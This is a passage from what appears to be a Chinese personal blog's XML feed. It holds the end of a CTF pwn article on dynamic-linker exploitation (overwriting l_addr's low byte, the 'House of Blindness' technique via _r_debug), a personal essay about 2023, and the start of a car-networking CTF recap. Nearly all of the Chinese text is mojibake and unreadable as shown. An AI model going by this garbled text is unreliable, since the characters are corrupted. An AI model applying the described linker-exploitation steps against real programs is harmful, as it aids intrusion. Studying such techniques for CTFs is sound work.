l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>ÊåáÂêëËØ•ÊåáÈíàÔºåËææÊàêÁ¨¨‰∫åÊ¨°fmt„ÄÇÂú®Ê≥ÑÈú≤ÂêÑÂú∞ÂùÄ‰πãÂêéËøòËÉΩÂÜçËØ•<code>l_addr</code>‰Ωø<code>.fini</code>ÂÆö‰ΩçÂà∞mainËææÊàêÁ¨¨‰∏âÊ¨°fmt„ÄÇ</p><h2 id="House-of-Blindness"><a href="#House-of-Blindness" class="headerlink" title="House of Blindness"></a>House of Blindness</h2><p>ËØ•ÊâãÊ≥ïÊó†ÈúÄÊ≥ÑÈú≤Âú∞ÂùÄÔºåÈúÄË¶ÅmmapÁõ∏ÂÖ≥ÁöÑ‰ªªÊÑèÂÜô</p><p>‰æùÊóßÊòØÊîπÂÜô<code>l_addr</code>ÁöÑLSBÔºå‰Ωø<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</code>ÊåáÂêëÁõÆÊ†áÂáΩÊï∞„ÄÇÁÑ∂ËÄå<code>.dynamic</code>ÂæàÂ§ßÔºåË∂ÖËøá‰∫Ü256bytesÔºåËøôÊÑèÂë≥ÁùÄÂèØËÉΩÈúÄË¶ÅÁàÜÁ†¥‰∏Ä‰∏™byte„ÄÇ</p><p>ËØ•ÊâãÊ≥ïÁªôÂá∫‰∫Ü‰∏çÁî®ÁàÜÁ†¥ÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ‰ΩøÁî®<code>.dynamic</code>ÊÆµ‰∏≠ÁöÑ<code>DT_DEBUG</code>È°π„ÄÇËØ•È°πÊåáÂêë‰∫Ü‰∏Ä‰∏™‰Ωç‰∫éld.so‰∏≠ÁöÑ<code>_r_debug</code>ÁªìÊûÑÔºå‰∏îÊúâÂèØÂÜôÊùÉÈôêÔºåÂèØ‰ª•ÈÄöËøáË¶ÜÁõñLSBËææÊàêÂØπlibcÂáΩÊï∞ÁöÑË∞ÉÁî®„ÄÇ<br>Áî±‰∫éld.soÂú∞ÂùÄÂú®libc.so‰πãÂêéÔºåÂú∞ÂùÄÊòæÁÑ∂Êõ¥Â§ßÔºåÂèØ‰ª•Â∞Ü<code>l_addr</code>Êîπ‰∏∫Ë¥üÊï∞(Ë°•Á†ÅÂΩ¢Âºè)Êù•Ëß£ÂÜ≥„ÄÇ<br>Âè¶Â§ñÔºåÊ≠§Êó∂ÁöÑrdiÊ≠£Â•ΩËêΩÂú®<code>dl_load_lock</code>‰∏äÔºå‰Ωç‰∫éld.so‰∏≠Ôºå‰πüÊòØÂèØÊéßÁöÑ„ÄÇ</p><hr><p>ÂèÇËÄÉËµÑÊñô:</p><ul><li><a href="https://bbs.kanxue.com/thread-253833.htm#msg_header_h2_2">[ÁúãÈõ™]dl_runtime_resolveÁªìÂêàÊ∫êÁ†ÅÂàÜÊûêÂèäÂ∏∏ËßÅÁöÑÂá†ÁßçÊîªÂáªÊâãÊ≥ï</a></li><li><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md">CTF-All-In-One</a></li><li><a href="https://zhuanlan.zhihu.com/p/657009223">[Áü•‰πé]HitconCTF2023 pwn Wall-Sina wp</a></li><li><a href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA#refining-our-exploit-with-_r_debug">[Hackmd]house of blindness</a></li><li>„ÄäÁ®ãÂ∫èÂëòÁöÑËá™Êàë‰øÆÂÖª„Äã</li></ul>]]></content>
    
    
    <summary type="html">Â∞èpwnÊâã‰∏çÂæó‰∏çÂìÅÁöÑdlÈ≠îÊ≥ï</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023 Âú®ÈÄÉÁ¶ª‰πãÂêé</title>
    <link href="http://deepunk.icu/2023%EF%BC%9A%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/"/>
    <id>http://deepunk.icu/2023%EF%BC%9A%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/</id>
    <published>2024-02-07T15:06:50.000Z</published>
    <updated>2024-02-07T15:11:58.469Z</updated>
    
    <content type="html"><![CDATA[<p>ÁÜ¨Ëøá‰∫ÜËâ∞ÈöæÁöÑÊúüÊú´ÔºåÁªà‰∫éÊúâÁÇπÁ≤æÂäõÂÜô‰∫õÊÉ≥Ë°®ËææÁöÑ‰∏úË•ø„ÄÇËøôÁßçÊÑüËßâ‰∏ÄÂ¶ÇÈ´òËÄÉÂÆåÁöÑÈÇ£‰∏™ÊöëÂÅáÈáåÔºåÂú®Ëø∑Ëå´‰∏≠ÂÜôÂÜôÂàíÂàíÔºå‰ºÅÂõæÂú®ÊñáÂ≠ó‰∏≠ÊâæÂà∞‰∏ÄÁßçÂäõÈáèÊÑü„ÄÇ‰πãÂêéÁöÑ‰∏ÄÂπ¥ÔºåËøáÂæóÂÉè‰∏≠Â≠¶Â¢ô‰∏äÁöÑÊ®°ËåÉËÆÆËÆ∫ÊñáÔºåÂ°´Êª°‰∫ÜÂ≠óÔºåËØª‰∏çÂá∫ÊÑèÊÄù„ÄÇÂç≥‰ΩøÂú®‰∫∫ÁîüËµ∞È©¨ÁÅØÈáåÔºå‰πüÊòØË¢´‚Äùa few years later‚Äù‰∏ÄÁ¨îÂ∏¶ËøáÁöÑÊ∞¥Âπ≥„ÄÇÂΩìÁÑ∂ÔºåÂ•ΩÁöÑÊïÖ‰∫ãÊÄªË¶ÅÂ≠¶‰ºöÂú®‰∏çËØ•Á≤æÂΩ©ÁöÑÂú∞Êñπ‰∏çÁ≤æÂΩ©„ÄÇÊ≠£Â•ΩÂâçÂπ¥ÁöÑÊïÖ‰∫ã‰πüÂøòËÆ≤‰∫ÜÔºåÈÇ£Â∞±‰ªéÂ§¥ËÆ≤Ëµ∑Âêß„ÄÇ</p><p>È´òËÄÉÂÆåÁöÑÊó•Â≠êÔºå‰∏ÄÊã®‰∫∫ÂøôÁùÄÁºÖÊÄÄÔºå‰∏ÄÊã®‰∫∫ÂøôÁùÄÈÄÉÁ¶ª„ÄÇÊàëÁêÜÂ∫î‰πüÂøôÁùÄÈÄÉÁ¶ª„ÄÇ‰ΩÜÂøç‰∏ç‰ΩèÁªôÂñúÊ¨¢ÁöÑÂ•≥ÁîüÂèë‰∫ÜÊù°Ê∂àÊÅØÔºåÈ°∫ÁêÜÊàêÁ´†Âú∞ÔºåËÆ©Êú¨Â∞±‰∏çÂ§™‰∏ÄÂ∏ÜÈ£éÈ°∫ÁöÑÈÄÉÁ¶ª‰πãÊóÖÈõ™‰∏äÂä†Èúú„ÄÇÂú®ÂæóÊâã‰πãÂâçÔºåÂú®ÈÄÉÁ¶ª‰πãÂêéÔºåÊàëÂú®ÂçÅÂÖ´Â≤ÅÁîüÊó•ÈÇ£Â§©‰∏ÄÈÅçÈÅçÊ¢≥ÁêÜÁùÄËá™Â∑±Êó¢‰∏çÂ≤ÅÊúàÈùôÂ•Ω‰πü‰∏çÊ≥¢ÊæúÂ£ÆÈòîÁöÑÂâçÂçäÁîü„ÄÇ‰∫∫ÊÄªÊòØÂú®Êó•Â§ç‰∏ÄÊó•ÈáåÊ∏¥ÊúõÈÅáËßÅÊîπÂèòÔºåÁõ¥Âà∞ÊÑèËØÜÂà∞ÊîπÂèòÊ∞∏Ëøú‰∏ç‰ºöÂ•î‰ªñËÄåÊù•ÔºåËøôÊó∂ÂÄôÁöÑ‰ªñÔºåÊµëÁÑ∂‰∏çËßâÂ∑≤ÁªèÂú®Á≠âÂæÖÁùÄ‰∏ÄÂ£∞Âèë‰ª§‚Äî‚Äî‰∏Ä‰∏™ÊÑè‰πâÈùûÂá°ÁöÑÊó•Â≠ê„ÄÅ‰∏ÄÂè•ËØù„ÄÅ‰∏Ä‰∏™‰∫∫„ÄÇÈÇ£Â§©ÊàëÁúüÊ≠£ÂÜ≥ÂÆöË¶ÅÈÄÉÁ¶ªÔºåÊàëÁü•ÈÅìÊàëÁöÑ‰∏ÄÈÉ®ÂàÜËøòÂõ∞Âú®ÈÇ£Èáå„ÄÇÂÆÉ‰∏çÂú®Â≠¶Ê†°ÈáåÈù¢ÔºåËÄåÂú®Ê≤øÁùÄÂú∞Âü∫ÂæÄ‰∏ã‰∫îÂçÉ‰∏áÂÖ¨ÈáåÊ∑±Â§Ñ„ÄÇÈÇ£ÈáåÊúâ‰∏ÄÊù°Ê†πÔºåË¥ØÁ©øÊàëÂèóÊïôËÇ≤ÁöÑÂâçÂçäÁîüÔºåËîìÂª∂ÔºåÁîüÈïøÔºåÂú®ÁîüÂëΩÁöÑÁªàÁÇπÊúùÊàëÊå•Êâã„ÄÇ</p><p>ÊàëÂèàÊÉ≥Âà∞Â§ß‰∏Ä„ÄÇÂ§ß‰∏ÄÁöÑÂÖ≥ÈîÆËØçÊòØ‚ÄúÊÇ¨ÊµÆ‚Äù„ÄÇÈÇ£ÊòØ‰ªÄ‰πàÊÑüËßâÔºåÂ∞±ÂÉè‰∏ÄÈòµÈ£éÊâòËµ∑Ôºå‰Ω†ÂíåÂë®ÈÅ≠‰∏ñÁïåÂ∞±ÊµÆÂà∞‰∫ÜÂçäÁ©∫‰∏≠„ÄÇ‰Ω†ÁöÑÂäõÈáèÔºåÂú®Ëøô‰∏™Ê≤°ÊúâÊîØÁÇπÁöÑÁ©∫‰∏≠ËΩªÈ£òÈ£òÁöÑÔºåÁ®ç‰∏çÊ≥®ÊÑèËøò‰ºöÂ§±ÂéªÂπ≥Ë°°„ÄÇ‰∫éÊòØ‰Ω†ÂíåÂë®Âõ¥ÁöÑ‰∫∫‰∏ÄËµ∑È£òÂïäÈ£ò„ÄÇÊ∑∑Ê≤åËøêÂä®ÈáåÊ≤°Êúâ‰∫∫Áü•ÈÅìÁõÆÁöÑÂú∞„ÄÇ</p><p>Âú®Ëøô‰∏™ËØªÁ†îÂá†‰πéÊàê‰∏∫ÂîØ‰∏ÄÂá∫Ë∑ØÁöÑ‰∏ì‰∏öÔºåËøΩÊ±ÇÊûÅËá¥ÁöÑÂàÜÊï∞ÊòØÁîüÂ≠òÁöÑÊú¨ËÉΩ„ÄÇÊàëÁúãÂà∞‰∏Ä‰∫õ‰ºòÁßÄÁöÑÂêåÂ≠¶‰∏∫‰∫ÜËÄÉËØïÂ•âÁåÆ‰∫ÜËá™Â∑±Â§ßÈÉ®ÂàÜÊó∂Èó¥ÔºåÁÑ∂ÂêéÂÖ¨ÂºÄÊàñÁßÅ‰∏ãÁî®‚ÄúÂç∑‚ÄùËØÑ‰ª∑ÁùÄÂÖ∂‰ªñÂä™ÂäõÁöÑÂêåÂ≠¶ÔºåËΩ¨Â§¥ÂèàÂú®Êüê‰∫õ‰∫§ÊµÅÁæ§Èáå‰ª•‚ÄúXÁ•û‚Äù‚ÄúX‰Ω¨‚Äù‰∫íÁõ∏ÂêπÊçß„ÄÇÊàëÊó†ÊÑèÊåáË∞™ÔºåÈÄâÊã©ËøôÁßçÊ¥ªÊ≥ïÁöÑÊòØÁéØÂ¢ÉÔºåËÄåÈùû‰ªñ‰ª¨„ÄÇ‰ΩÜ‰ªéÂ∞èÂà∞Â§ßÁúãÂêåÊ†∑ÁöÑÂâßÊú¨Â§öÂ∞ë‰ºöÂÆ°ÁæéÁñ≤Âä≥Ôºå‰ΩïÂÜµÂèõÈÄÜÂ¶ÇÊàë„ÄÇ‰∫éÊòØÊàëÂºÄÂßãÁøòËØæÔºåËµ∑ÂàùÂè™ÁøòCËØ≠Ë®Ä‰∏ÄÁ±ªÁöÑÊ∞¥ËØæÔºåÁÑ∂ÂêéÂºÄÂßãÈó¥Ê≠áÁøòÂæÆÁßØÂàÜ‰∏ÄÁ±ªÁöÑÊ≠£ËØæÔºåÁõ¥Âà∞ÂèëÁé∞ËøõÂ∫¶Ë∑ü‰∏ç‰∏äÔºåÁ¥¢ÊÄß‰∏ÄËäÇÈÉΩ‰∏çÂéª‰∫Ü„ÄÇÂ•ΩÂú®ËÄÉÂâçÂäõÊåΩÁãÇÊæúÔºåÊúÄÂêéÊùÇÊäÄËà¨ÂÆâÁ®≥Âú∞ËêΩÂú®‰øùÁ†îÁ∫øÈáå„ÄÇ</p><p>ÁøòÂá∫Êù•ÁöÑÊó∂Èó¥‰πüÊú™ÂøÖÂπ≤‰∫Ü‰ªÄ‰πàÊ≠£‰∫ãÔºåÈô§‰∫ÜÁù°ËßâÔºåÈ°∫Âà©ÂÆåÊàêÁöÑÂè™ËÆ∞ÂæóÈÄöËøáÂáùËÅöÊãõÊñ∞„ÄÇÂâ©‰∏ãÁöÑÈÉΩÊòØ‰∫õËçíÂîêÁöÑÂ§±Ë¥•ÔºöÊåëÊàò‰∏Ä‰∫∫ÂÆåÊàêÁîµËµõÈ¢òÁõÆÔºàÁÑ∂ÂêéÂú®Êà™Á®øÂâçÂèëÁé∞pcbÂ∞ÅË£ÖÁîªÂèçÔºâ„ÄÅÊåëÊàòÂêå‰∏ÄÂ§©ÊâìÊ†°ÂÜÖacmÂíåÂè∞ÁêÉÊ†°Ëµõ„ÄÅÊåëÊàòËØªÂÆåÂõæ‰π¶È¶ÜÈáåÂêÑÁßçÁ®ÄÂ•áÂè§ÊÄ™ÁöÑÈ¢ÜÂüüÁöÑ‰ª£Ë°®‰ΩúÂìÅ„ÄÇ‰∏çÂ∏¶Êù•Êî∂Ëé∑ÁöÑÂ§±Ë¥•ÔºåÁîöËá≥Êúâ‰∫õ‰πèÂë≥„ÄÇ‰πèÂë≥ÂΩìÁÑ∂ÊòØÁõ∏ÂØπÁöÑÔºå‰∏ÄÁõ¥Ëæì‰πüÊØî‰∏ç‰∏äÂú∫Â•Ω„ÄÇ</p><p>ÂêéÈù¢Â∞±ÊòØ‰ª•ÂâçÊèêËøáÁöÑËÄÅÂâßÊÉÖÔºåËßÇÊë©ASCÔºåÂèÇÂä†ÂõΩËµõÔºåÈáçÊñ∞ËûçÂÖ•ÂáùËÅöbalabala„ÄÇÊúÄÈáçË¶ÅÁöÑÔºåÂ§ßÊ¶ÇÊòØÊâæÂà∞‰∫ÜÁÉ≠Áà±ÁöÑÊñπÂêëÂíå‰∏ÄÁæ§ÂøóÂêåÈÅìÂêàÁöÑ‰∫∫„ÄÇ</p><p>ËøôÊòØÊ≠£Èù¢ÁöÑÂΩ±ÂìçÔºå‰ªéË¥üÈù¢Êù•ËØ¥Ôºå‰∏Ä‰∏™ÊòéÁ°ÆÁöÑÊñπÂêëÔºåËÆ©ÊàëÂØπËØæÂÜÖÊõ¥‰∏ç‰∏äÂøÉ‰∫Ü„ÄÇÊçÆÁªüËÆ°ÔºåÊàë23‰∏ãÂçäÂπ¥‰∏≠ÂêéÊúü‰∏ÄÂë®Âπ≥ÂùáÂè™‰∏ä‰∫Ü2.5ËäÇËØæÔºåÂèàÂ∑≤Áü•ÊàëÂú®Â§ç‰π†ÊúüÈó¥Áõ∏ÂΩìÊµÆË∫ÅÔºà‰∏îÊ≤âËø∑R6ÔºâÔºåÊòìÂæóÔºöÊàëÁöÑÁª©ÁÇπÂ∞ÜÊÉ®‰∏çÂøçÁùπ„ÄÇÔºàÊú¨ÊñáÂä®Á¨îÊó∂ÔºåÊàë‰∏ÄÂ∫¶Áõ∏‰ø°ÂçäÂØº‰ΩìÁâ©ÁêÜÂ∞ÜËøéÊù•ÊàëÁöÑÁ¨¨‰∏ÄÈó®ÊåÇÁßë„ÄÇÁî±‰∫éÊú¨ÊñáË∑®Ë∂ä‰∏Ä‰∏™Â§öÊúàÊâçÂÆåÊàêÔºåÂÜôÂà∞Êú¨ÊÆµÊó∂ÊàêÁª©Êó©Â∞±Âá∫‰∫ÜÔºåÊàëÁé∞Âú®Áü•ÈÅìÊàëË¢´Êçû‰∫ÜÔºåÊúâÈÅìÊòØÔºöÂ§©Êó†Áªù‰∫∫‰πãË∑ØÔºâËøôÁßçÊàêÁª©Âü∫Êú¨ÂÆ£ÂëäÂíå‰øùÁ†îÊó†Áºò‰∫Ü„ÄÇ</p><p>Ëøô‰∏™ÁªìÊûúÂπ∂Ê≤°ÊúâÂºïËµ∑ÊàëÂ§öÂ∞ëËß¶Âä®ÔºåÂ•ΩÂÉèÊó©Â∞±Áü•ÈÅì‰ºöËµ∞Âà∞Ëøô‰∏ÄÊ≠•„ÄÇÊàëÊÉ≥ÔºåÂç≥‰ΩøËÆ©Êó∂Èó¥ÂÄíÊµÅ‰∏§‰∏™ÊúàÔºåÊèêÂâçÂºÄÂßãÂ§ç‰π†ÔºåÊàë‰æùÊóß‰ºöÂú®ËÉΩÊÑüÁü•Âà∞Âç±Èô©ÁöÑÈÇ£‰∏™ËäÇÁÇπ‰πãÂâçÊå•ÈúçÊó∂Èó¥ÔºåÊúÄÂêé‰æùÊóßÊòØÂãâÂãâÂº∫Âº∫Â§ç‰π†‰∏™Â§ßÊ¶ÇÁöÑÁªìÊûú„ÄÇÂ¶ÇÊûúÊàëÂáèÂ∞ëÁøòËØæÊ¨°Êï∞ÔºåÊàë‰ºöÂõ†‰∏∫Â¢ûÊ∑ªÁöÑ‰ø°ÂøÉÔºåÁªßÁª≠Âª∂ÂêéÈÇ£‰∏™ËÆ§ÁúüÂ§ç‰π†ÁöÑËäÇÁÇπÔºåÊúÄÂêéÁöÑÁªìÊûú‰πü‰∏ç‰ºöÊîπÂèòÂ§öÂ∞ë„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂ§ç‰π†Êó∂Èó¥„ÄÅÁøòËØæÔºåËøô‰∫õÂèòÈáèÂ¶Ç‰ΩïÊîπÂèòÔºå‰πüÊó†Ê≥ïÊîπÂèòÂÖ∂ÁªìÊûú„ÄÇËÄÉËØïÁöÑÁªìÂ±ÄÔºåÂú®Â§±Ë¥•ËøôÈáåÊî∂Êïõ‰∫Ü„ÄÇËøô‰∏çÊòØÊîπÂ§¥Êç¢Èù¢ÁöÑÂÆøÂëΩËÆ∫ÔºåÊàëÂØπÂæÖÂ≠¶ÁßëÁöÑÁÉ≠ÊÉÖÔºåÂßãÁªàÊéßÂà∂ÁùÄÊî∂ÊïõÁöÑÊñπÂêë„ÄÇÂè™Ë¶Å‰∏çÂØπÂÖ≥ÈîÆÂèòÈáèÂÅöÂá∫ÊîπÂèòÔºåÂÜçÂ§öÁöÑÂ∞ùËØïÂíåÊÇîÊÅ®‰πüÊ≤°ÊúâÊÑè‰πâ„ÄÇ‰∏ÄÂàáÈÉΩÊòØÊàëÂ∫îÂæóÁöÑÔºåËøôÊ†∑ÁöÑËßÇÁÇπËÆ©ÊàëËΩªÊòìÂ∞±Êé•Âèó‰∫ÜÁé∞ÂÆû„ÄÇ</p><p>Ëøô‰πüÁÆóÈÄÉÁ¶ªÂêóÔºü‰ªéË°å‰∏∫‰∏äÊõ¥ÂÉèË¢´È©±ÈÄêÔºåÁúãÂéüÂõ†Âç¥ÂÉèÊó©ÊúâÈ¢ÑË∞ã„ÄÇ‰ªé‰∏ÄÊù°ÊòéÁ°ÆÁöÑËµõÈÅìÔºåËµ∞ÂêëÊú™Áü•ÁöÑÊó∑Èáé„ÄÇÂ•ΩÂ§ÑÊòØ‰∏çÁî®ÂÜç‰ªòÂá∫Áª¥ÊåÅÈÄâÊã©ÊùÉÁöÑÊàêÊú¨ÔºåËøôÂ§ßÊ¶ÇÊòØ‰∏ÄÁßçËá™Áî±ÔºåÂèØÊòØËá™Áî±Â∞ÜËêΩÂêë‰ΩïÂ§ÑÔºåÊàë‰∏çÁü•ÈÅì„ÄÇÂ¶ÇÊûúÊòéÂ§©ÁöÑÂÆâÂÖ®ÊÑü‰∏çËÉΩÊâò‰ªòÊüê‰∏™Âà∂Â∫¶„ÄÅÊüê‰∏™ÁªÑÁªáÔºåÈÇ£ÊàëÈÄâÊã©‰∫§ÁªôÊòéÂ§©ÁöÑËá™Â∑±„ÄÇ</p><p>ÈÇ£Âπ¥È´ò‰∏âÔºåÁ©∫Ê∞îÈò¥ÂÜ∑ÔºåËá™‰π†ËØæÔºåÁè≠‰∏ª‰ªªÊù•Âà∞Ë∑üÂâçÔºåÊàëËøòÊ≤âÊµ∏Âú®Âç°ÊãâÈ©¨‰ΩêÂ§´ÂÖÑÂºüÁöÑ‰∏ñÁïåÊµëÁÑ∂‰∏çËßâ„ÄÇÊàëÁõ∏‰ø°ÈÇ£‰∏ÄÂàªÊàëÂ∑≤ÁªèÈÄÉÁ¶ª‰∫ÜÔºåÈÄèËøáÂ±ÇÂ±Ç‰π¶Âç∑ÂíåÂ§©Ëä±ÊùøÔºå‰∫´ÂèóÁü≠ÊöÇÁöÑÁ••Âíå„ÄÇÊ≠§ÂêéÁöÑ‰∫∫ÁîüÔºåÊàëÂøÖÈ°ª‰∏çÂÅúÈÄÉ‰∏ãÂéªÔºåÊâçËÉΩË∫≤ËøáË∫´ÂêéÁöÑÂ¥©Âùè„ÄÇ</p>]]></content>
    
    
    <summary type="html">ÊîØÁ¶ªÁ†¥Á¢éÁöÑÊïÖ‰∫ãÔºåÊó†ÁóÖÂëªÂêüÁöÑÊÑüÊÖ®</summary>
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
  </entry>
  
  <entry>
    <title>Âº∫ÁΩëÊãüÊÄÅÂºÇÈóªÂΩï</title>
    <link href="http://deepunk.icu/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/"/>
    <id>http://deepunk.icu/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/</id>
    <published>2023-12-09T08:35:50.000Z</published>
    <updated>2023-12-09T14:13:23.580Z</updated>
    
    <content type="html"><![CDATA[<p>Âæà‰πÖÊ≤°ÊâìËøáËøô‰πà‰πÖÁöÑÁ∫ø‰∏ã‰∫Ü„ÄÇ</p><p>Âú®Âçó‰∫¨ÔºåÊåÅÁª≠72Â∞èÊó∂ÔºåÂíå‰∏ñÁïåÂêÑÂú∞ÁöÑÂº∫ÂäõÊàòÈòüÂêåÂè∞Á´ûÊäÄ„ÄÇ‰∏çÂæó‰∏çËØ¥ÔºåÂê¨Ëµ∑Êù•Êå∫ÈÖ∑„ÄÇ</p><h1 id="ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ"><a href="#ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ" class="headerlink" title="ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ"></a>ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ</h1><p>‰πãÂâç‰ªéÊù•Ê≤°ÊúâÊé•Ëß¶Ëøáiot„ÄÅiov‰∏ÄÁ±ªÁöÑ‰∏úË•øÔºå‰∫éÊòØÊàëÂú®ÊØîËµõÂâç‰∏ÄÂë®ÂºÄÂßãÈõ∂Èõ∂Êï£Êï£Âú∞Â≠¶„ÄÇÊúÄÂêéÊÑüËßâÊúâ‰∫Ü‰∏ÄÁÇπÂõ∫‰ª∂ÂàÜÊûêÂíåÊó•Ë∑ØÁî±Âô®ÁöÑÂü∫Á°Ä; ËΩ¶ËÅîÁΩëÊñπÈù¢ËÉΩÊâæÂà∞ÁöÑËµÑÊñôÂ§ßÂ§öÊØîËæÉÊ®°Á≥äÈõ∂Êï£‰∏îÊäΩË±°ÔºåÊ≤°ÊúâÂÆûÈôÖ‰∏äÊâãËøáÔºåÊúÄÂêéËøòÊòØ‰∏ÄÂ§¥ÈõæÊ∞¥„ÄÇ</p><p>ÂÆûÈôÖ‰∏äÊØîËµõ‰∏≠Âç†Â§ßÂ§¥ÁöÑËøòÊòØËΩ¶ËÅîÁΩë„ÄÇËøô‰∏™ËµõÈÅìÂåÖÂê´t-box„ÄÅADASÈªëÁôΩÁõíÊ∏óÈÄèÔºåËøòÊúâ‰∏Ä‰∏™ÂÆûÂú∞Êó•ËΩ¶ÁöÑÊåëÊàò„ÄÇ</p><p>t-boxÈªëÁõíÈ¢ò‰∏≠ÊúâÂá†‰∏™ËÆæÂ§áÊèê‰æõ‰∫ÜarmÂõ∫‰ª∂Ôºå‰ΩÜÊòØÂàÜÊûê‰πãÂêéÊàëÁ°ÆÂÆûÊâæ‰∏çÂà∞Â¶Ç‰Ωï‰∏ãÊâã„ÄÇÊúâÁöÑÁúãËµ∑Êù•ÊòØ‰∏ÄÈÅìÈÄÜÂêëÈ¢òÔºåÁÑ∂ËÄåÂ∞±ÁÆóÁªôÂá∫Ê≠£Á°ÆÁöÑËæìÂÖ•ÔºåÊúÄÂêéÊãøÂà∞ÁöÑ‰πü‰∏çÊòØÈ¢òÁõÆË¶ÅÊ±ÇÁöÑflagÔºåÊ≠§Â§ñ‰πüÊ≤°ÊúâÂà´ÁöÑÊºèÊ¥ûÂèØ‰ª•Âà©Áî®„ÄÇËøòÊúâ‰∏ÄÈÅìÂ≠òÂú®‰∏Ä‰∏™Êï∞ÁªÑ2byteÁöÑË∂äÁïåÔºå‰ΩÜÊòØËøô‰∏™Ë∂äÁïåÊ≤°Êúâ‰ªª‰ΩïÂçµÁî®ÔºåÂè™ËÉΩË¶ÜÁõñ‰∏Ä‰∏™ÂûÉÂúæÂèòÈáè„ÄÇÊàñËÆ∏Ë∞ÉÁöÑlibcÂ≠òÂú®ÊºèÊ¥ûÔºüÊàëÊ≤°ÊâæÂà∞„ÄÇ</p><p>Âà´ÁöÑËΩ¶ËÅîÁΩëÁõ∏ÂÖ≥Âà©Áî®Â∞±Ë∂ÖÂá∫ÊàëÁöÑÁü•ËØÜËåÉÂõ¥‰∫ÜÔºåÂè™ËÉΩÂ∏ÆÈòüÂèãËØïËØïÂº±ÂØÜÁ†ÅÔºåÊâæÊâæÊïèÊÑüÊñá‰ª∂„ÄÇÂ±û‰∫éÂèÇ‰∏éÊÑü‰∏çÂº∫„ÄÇ‰∏çËøáÁúãÈòüÂèã‰º™ÈÄ†CANÊä•Êñá‰ªÄ‰πàÁöÑËøòÊòØÊå∫ÁÇ´ÈÖ∑ÔºåÂèØËÉΩ‰ª•ÂêéÁ†îÁ©∂‰∏Ä‰∏ãËøôÊñπÈù¢Ôºü</p><p>Ê≠§Â§ñÊØîËµõËøòÊúâ‰º†ÁªüÁöÑctfÔºå‰∏çËøáÂπ∂‰∏çËÆ°ÂÖ•ÊÄªÂàÜÔºåËÄåÊòØËé∑ÂèñÊåëÊàòÂÖ∂‰ªñÈ¢òÁõÆËµÑÊ†ºÁöÑÈÄîÂæÑ„ÄÇÂÅö‰∫ÜÈÅìqilingÊ°ÜÊû∂ÁöÑÊ†àÊ∫¢Âá∫Ôºå‰∏çËøáÊ≤°Âï•Êñ∞‰∏úË•øÔºåÊúÄÂêéËøòÂõ†‰∏∫ÊâãËæìflagÂ≠óÁ¨¶‰∏≤ÂØºËá¥Êú´Â∞æÂ∏¶\nÔºåorwËØª‰∏çÂá∫Êù•Ôºådebug‰∫Ü‰∏§‰∏™Â∞èÊó∂„ÄÇÂ∫¶Ëøá‰∫Ü‰∏ÄÊÆµÁõ∏ÂØπÂ§±Ë¥•ÁöÑÊØîËµõÊó∂Èó¥„ÄÇ</p><h1 id="ÊàëÂéªÔºåALLES"><a href="#ÊàëÂéªÔºåALLES" class="headerlink" title="ÊàëÂéªÔºåALLES!"></a>ÊàëÂéªÔºåALLES!</h1><p>‰πãÂâçÂõ†‰∏∫‰∏Ä‰∏™ÊØîËæÉÂñúÊ¨¢ÁöÑyoutubeÂçö‰∏ªLiveOverflowÔºå‰∫ÜËß£Âà∞‰∫Ü‰ªñÊâÄÂú®ÁöÑËøô‰∏™Âæ∑ÂõΩÊàòÈòü„ÄÇÁúãÂà∞ËøôÊ¨°ÊØîËµõÈÇÄËØ∑‰∫ÜALLESÔºåÊàëËøòÊå∫ÊúüÂæÖÔºåËôΩÁÑ∂ÊúÄÂêé‰ªñÊ≤°ÊúâÊù•„ÄÇ</p><p>ÊØîËµõÁ¨¨‰∏âÂ§©ÁöÑÊó∂ÂÄôÔºåÊàëËøòÊòØÂèó‰∏ç‰∫Ü8Ôºö30Âá∫ÂèëÁöÑ‰ΩúÊÅØÔºå‰∫éÊòØÁù°Â§ßËßâÂà∞‰∫ÜÂçÅ‰∏ÄÁÇπ„ÄÇÂá∫Èó®ÊâìËΩ¶Êó∂ÔºåÂú®ÈÖíÂ∫óÈó®Âè£ÂÅ∂ÈÅá‰∫ÜALLES!ÁöÑ‰∏â‰∏™Âì•‰ª¨ÔºàÊúâ‰∏Ä‰∏™ËøòÊ≤°‰∏ãÊù•Ôºâ„ÄÇ</p><p>‰∫éÊòØÊàëÁ§æ‰∫§Â§ßÂ∏àÂ±ûÊÄßÂ§ßÁàÜÂèëÔºå‰∏äÂâçÊê≠ËÆ™„ÄÇÈ°∫‰æøÈóÆ‰∫ÜÈóÆ‰ªñ‰ª¨ÂØπËøôÊ¨°ÊØîËµõÁöÑÁúãÊ≥ïÔºåÂá†‰ΩçËÄÅÂì•ÂæàÁÉ≠ÊÉÖÔºåËΩÆÊµÅËØ¥‰∫Ü‰∏ÄÂ§ßÂ†Ü„ÄÇÊÄªÁöÑÊù•ËØ¥Â∞±ÊòØÊØîËµõÈ¢òÁõÆÂæàÊúâÊñ∞ÊÑè„ÄÅ‰πüÂæàÈöæÔºåÈ°∫‰æøÂêêÊßΩ‰∫Ü‰ª•